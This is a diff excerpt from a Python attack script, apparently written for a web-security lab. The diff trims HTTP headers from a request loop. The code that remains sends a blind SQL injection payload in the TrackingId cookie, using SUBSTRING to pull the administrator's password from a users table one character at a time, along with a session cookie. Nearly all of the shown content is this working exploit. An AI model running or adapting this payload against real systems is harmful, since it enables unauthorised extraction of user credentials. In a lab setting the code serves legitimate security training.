@@ -10,19 +10,6 @@ for i in range(1,21):
         headers = {
             "Cookie": f"TrackingId=fjJBOAOlql0W3MwS' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}; session=pY4KuDv8VtX62ftaFzSzfe80gfF4DHDM",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": base_url,
-            "Upgrade-Insecure-Requests": "1",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-User": "?1",
-            "Priority": "u=0, i",
-            "Te": "trailers",
-            "Connection": "keep-alive"
         }
 
         response = get(base_url_filter, headers=headers)
